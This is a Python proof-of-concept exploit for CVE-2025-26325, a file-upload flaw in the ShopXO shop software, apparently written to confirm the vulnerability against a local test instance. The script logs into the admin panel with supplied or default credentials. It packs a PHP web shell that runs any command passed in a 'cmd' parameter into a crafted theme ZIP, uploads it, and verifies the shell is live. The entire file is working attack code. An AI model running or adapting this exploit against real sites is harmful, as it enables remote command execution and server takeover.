import requests
import zipfile
import io
import os
import sys
import time
import random
import string

class CVE202526325:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.admin_url = None
        self.shell_path = None
        
    def random_string(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def find_admin_entry(self):
        try:
            resp = self.session.get(f"{self.target_url}/", allow_redirects=True, timeout=10)
            for filename in ['admin.php', 'adminaeckwl.php']:
                test_url = f"{self.target_url}/{filename}"
                resp = self.session.get(test_url, allow_redirects=False, timeout=10)
                if resp.status_code in [200, 302]:
                    self.admin_url = test_url
                    return True
            print("[*] Finding admin entry...")
            resp = self.session.get(f"{self.target_url}/", timeout=10)
            if 'admin' in resp.text.lower():
                import re
                match = re.search(r'(admin[a-z0-9]*\.php)', resp.text, re.I)
                if match:
                    self.admin_url = f"{self.target_url}/{match.group(1)}"
                    return True
        except Exception as e:
            print(f"[-] Error finding admin: {e}")
        return False
    
    def login(self, username, password):
        if not self.admin_url:
            if not self.find_admin_entry():
                print("[-] Cannot find admin entry")
                return False
        
        print(f"[*] Admin URL: {self.admin_url}")
        login_url = f"{self.admin_url}?s=admin/login"
        
        data = {
            'accounts': username,
            'pwd': password,
            'type': 'username'
        }
        
        try:
            resp = self.session.post(login_url, data=data, timeout=10)
            result = resp.json()
            if result.get('code') == 0:
                print(f"[+] Login successful")
                return True
            else:
                print(f"[-] Login failed: {result.get('msg', 'Unknown error')}")
        except Exception as e:
            print(f"[-] Login error: {e}")
        return False
    
    def create_malicious_zip(self):
        unique_id = self.random_string(32)
        shell_name = f"shell_{self.random_string(6)}.php"
        
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            config = {
                "unique": unique_id,
                "name": "test_theme",
                "theme": "default",
                "view": -1,
                "type": 0,
                "data": {}
            }
            import json
            zf.writestr(f"{unique_id}/config.json", json.dumps(config))
            
            shell_content = '<?php echo "CVE-2025-26325"; if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
            shell_path = f"{unique_id}/{unique_id}/{shell_name}"
            zf.writestr(shell_path, shell_content)
        
        zip_buffer.seek(0)
        self.shell_name = shell_name
        return zip_buffer.getvalue(), unique_id
    
    def get_data_id(self):
        try:
            list_url = f"{self.admin_url}?s=themedata/index"
            resp = self.session.get(list_url, timeout=10)
            import re
            matches = re.findall(r'data-id="(\d+)"', resp.text)
            if matches:
                return max([int(m) for m in matches])
        except:
            pass
        return None
    
    def upload_theme_data(self, zip_data):
        upload_url = f"{self.admin_url}?s=themedata/upload"
        
        files = {
            'file': ('theme_data.zip', zip_data, 'application/zip')
        }
        
        try:
            resp = self.session.post(upload_url, files=files, timeout=30)
            result = resp.json()
            if result.get('code') == 0:
                print(f"[+] Upload successful")
                return True
            else:
                print(f"[-] Upload failed: {result.get('msg', 'Unknown error')}")
        except Exception as e:
            print(f"[-] Upload error: {e}")
        return False
    
    def verify_shell(self):
        shell_url = f"{self.target_url}/{self.shell_name}"
        print(f"[*] Checking shell: {shell_url}")
        
        try:
            resp = self.session.get(shell_url, timeout=10)
            if "CVE-2025-26325" in resp.text:
                print(f"[+] Shell uploaded successfully!")
                print(f"[+] Shell URL: {shell_url}")
                return True
        except Exception as e:
            print(f"[-] Verify error: {e}")
        return False
    
    def exploit(self, username, password):
        print("[*] CVE-2025-26325 - ShopXO File Upload Vulnerability")
        print(f"[*] Target: {self.target_url}")
        
        if not self.login(username, password):
            return False
        
        print("[*] Creating malicious ZIP...")
        zip_data, unique_id = self.create_malicious_zip()
        
        print("[*] Uploading theme data...")
        if not self.upload_theme_data(zip_data):
            return False
        
        time.sleep(1)
        
        print("[*] Verifying shell...")
        return self.verify_shell()


def main():
    target = os.environ.get('TARGET_URL', 'http://localhost:18088')
    username = os.environ.get('ADMIN_USER', 'admin')
    password = os.environ.get('ADMIN_PASS', 'admin123')
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    if len(sys.argv) > 2:
        username = sys.argv[2]
    if len(sys.argv) > 3:
        password = sys.argv[3]
    
    poc = CVE202526325(target)
    success = poc.exploit(username, password)
    
    if success:
        print("\n[+] Exploit successful! Vulnerability confirmed.")
        return 0
    else:
        print("\n[-] Exploit failed.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
